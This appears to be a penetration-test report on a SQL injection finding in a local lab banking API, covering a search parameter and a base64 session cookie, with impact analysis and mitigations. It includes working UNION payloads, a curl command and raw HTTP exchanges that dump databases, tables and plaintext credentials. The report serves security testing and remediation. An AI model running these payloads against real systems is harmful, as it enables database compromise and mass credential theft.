# Issue #08 — SQL Injection in Transaction Search Parameter

| Field         | Details                                          |
|---------------|--------------------------------------------------|
| **Target**    | BankWeb API — `http://localhost:1337`            |
| **Severity**  | Critical                                         |
| **CVSS v3.1** | 8.8                                              |
| **Vector**    | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H             |
| **Category**  | Injection — SQL Injection                |

---

## Summary

The transaction search functionality at `/api/Transaction/GetTransactions` is vulnerable to UNION-based SQL injection via the `search[value]` query parameter. User input is passed directly into a SQL query without sanitisation or parameterisation, allowing an authenticated attacker to manipulate the query structure and interact with the underlying Microsoft SQL Server database arbitrarily.

Full exploitation was confirmed: the database server version, the complete list of databases, all table names, and the entire `UserData` table — including usernames and plaintext passwords for every account in the application — were extracted. Additionally, a second injection point was identified in the session cookie itself, where the username segment is also interpolated into SQL queries unsafely.

---

## Steps to Reproduce

### Vector A — Search Parameter

1. Log in to the application and navigate to the **Transactions** page.
2. Open a proxy (e.g. Burp Suite) or browser DevTools and intercept the search request.
3. Inject a UNION-based payload into the `search[value]` parameter:

   ```
   ' UNION SELECT * from Transactions --
   ```

4. URL-encode the payload and send the request:

   ```bash
   curl -s "http://localhost:1337/api/Transaction/GetTransactions?\
   start=0&length=10\
   &search%5Bvalue%5D='%20UNION%20SELECT%20*%20from%20Transactions%20--\
   &search%5Bregex%5D=false" \
   -H "Cookie: SessionId=[REDACTED]"
   ```

5. Observe that the response returns all 42 transactions from the database, including sender and receiver email addresses.

### Vector B — Session Cookie

1. While authenticated, capture the `SessionId` cookie value.
2. Decode the base64-encoded username segment (the portion before the first `%26`).
3. Replace the decoded username with a SQL injection payload:

   ```
   ') OR id=20 --
   ```

4. Re-encode to base64, reassemble the cookie, and send any request to `/api/Transaction/GetTransactions`.
5. Observe that the query is manipulated by the injected condition, returning transactions for an arbitrary user ID.

---

## Proof of Concept

### Vector A — Extracting All Transactions

**Request:**

```http
GET /api/Transaction/GetTransactions?start=0&length=10&search%5Bvalue%5D='%20UNION%20SELECT%20*%20from%20Transactions%20--&search%5Bregex%5D=false&_=1751733102637 HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Cookie: SessionId=[REDACTED]
```

**Response (truncated):**

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Sat, 05 Jul 2025 16:46:05 GMT
Server: Kestrel
Content-Length: 2273

{"recordsTotal":42,"recordsFiltered":42,"data":[{"id":1002,"senderId":"[REDACTED]","receiverId":"[REDACTED]","dateTime":"07/06/2025","reason":"1","amount":1,"reference":"1",...},...]}
```

The response confirms all 42 transaction records were returned, including sender and receiver identifiers.

---

### Further Exploitation — Escalating the Injection

The following payloads were used to progressively enumerate the database. **All extracted values containing real usernames, passwords, email addresses, or internal data have been redacted.**

**1. Extract database server version:**

```sql
' UNION SELECT 42,@@VERSION,'third','01/01/2025','fourth',1337,'1' --
```

Result: `Microsoft SQL Server 2022 (RTM-CU20) [...] on Linux (Ubuntu 22.04.5 LTS)`

**2. Enumerate all databases:**

```sql
' UNION SELECT 42,(SELECT name + ',' FROM sys.databases FOR XML PATH('')),'third','01/01/2025','fourth',1337,'1' --
```

Result: `master, tempdb, model, msdb, [REDACTED], [REDACTED]`

**3. Enumerate tables in the application database:**

```sql
' UNION SELECT 42,(SELECT name + ',' FROM securebank..sysobjects WHERE xtype='U' FOR XML PATH('')),'third','01/01/2025','fourth',1337,'1' --
```

Result: `Sessions, Transactions, TransactionsGroupedByDay, UserData`

**4. Enumerate columns of the `UserData` table:**

```sql
' UNION SELECT 42,(SELECT column_name + ',' FROM information_schema.columns WHERE table_name='UserData' FOR XML PATH('')),'third','01/01/2025','fourth',1337,'1' --
```

Result: `Id, UserName, Name, Surname, Password, Role, Confirmed, RecoveryGuid`

**5. Extract all credentials from `UserData`:**

```sql
' UNION SELECT 42,(SELECT UserName + ',' + Password + ',' FROM UserData FOR XML PATH('')),'third','01/01/2025','fourth',1337,'1' --
```

Result: Full dump of all usernames and passwords confirmed. **Contents fully redacted** — extraction of [REDACTED] user credentials was verified during testing.

> **Note:** Passwords are stored in **plaintext** in the `UserData` table. This is a compounding vulnerability that amplifies the severity of this finding significantly.

---

### Vector B — Cookie-Based SQL Injection

**Request (malicious session cookie):**

```http
GET /api/Transaction/GetTransactions?start=0&length=10&search%5Bvalue%5D=&search%5Bregex%5D=false&_=1753017866641 HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Cookie: SessionId=[REDACTED-MALICIOUS]
```

The cookie's base64-encoded username segment was replaced with the following payload:

```sql
') OR id=20 --
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Sun, 20 Jul 2025 13:55:19 GMT
Server: Kestrel
Content-Length: 299

{"recordsTotal":1,"recordsFiltered":1,"data":[{"id":20,"senderId":"[REDACTED]","receiverId":"[REDACTED]","dateTime":"07/02/2025","reason":"[REDACTED]","amount":220.55,...}]}
```

The injected condition `OR id=20` was evaluated server-side, returning the transaction record for an arbitrary account not belonging to the authenticated session. This confirms the session cookie is also an unsanitised SQL injection vector.

---

## Impact

- **Full database compromise** — the injection allows complete read access to all tables in the application database, including `Sessions`, `Transactions`, and `UserData`. An attacker can enumerate every record without any privilege escalation.
- **Mass credential theft** — all user credentials were extracted in a single query. Because passwords are stored in plaintext (rather than hashed), stolen credentials are immediately usable for account takeover and credential stuffing against other services.
- **Cross-account data access via cookie injection** — Vector B demonstrates that an authenticated user can manipulate the session cookie to query data belonging to any other user, breaking all transaction-level access controls.
- **Potential for write operations** — while only SELECT-based payloads were tested during this assessment, UNION-based injections on Microsoft SQL Server may be chainable with stacked queries (`; INSERT`, `; UPDATE`, `; DROP`) depending on the database user's privileges, potentially allowing data modification or destruction.
- **Confirmed with Issue #04** — the error triggered by a single quote in Issue #04 was the initial signal for this finding. That unmanaged error directly facilitated discovery of this critical vulnerability.

---

## Recommended Mitigations

1. **Use parameterised queries or an ORM exclusively.** This is the only reliable fix for SQL injection. No form of input sanitisation or blacklisting is a substitute:

   ```csharp
   // Vulnerable
   var query = $"SELECT * FROM Transactions WHERE Reason LIKE '%{searchValue}%'";

   // Safe — parameterised
   var query = "SELECT * FROM Transactions WHERE Reason LIKE @search";
   command.Parameters.AddWithValue("@search", $"%{searchValue}%");
   ```

2. **Never interpolate session cookie values into SQL queries.** The username resolved from a session token must be retrieved from a trusted server-side store (e.g. the `Sessions` table by session ID), not read directly from the client-supplied cookie value and embedded in a query.

3. **Hash passwords using a strong, salted algorithm.** Plaintext password storage compounds this vulnerability into an immediate, full account takeover scenario. Passwords must be hashed using bcrypt, Argon2, or PBKDF2 before storage:

   ```csharp
   var hash = BCrypt.Net.BCrypt.HashPassword(plainTextPassword, workFactor: 12);
   ```

4. **Apply the principle of least privilege to the database account.** The application's SQL user should have only the permissions required for normal operation — ideally `SELECT`, `INSERT`, and `UPDATE` on specific tables only. `DROP`, `CREATE`, and access to system tables like `sys.databases` should be denied.

5. **Suppress database error messages** from all API responses (see Issue #04). The unmanaged error on a single quote was the initial indicator that led to full exploitation of this vulnerability.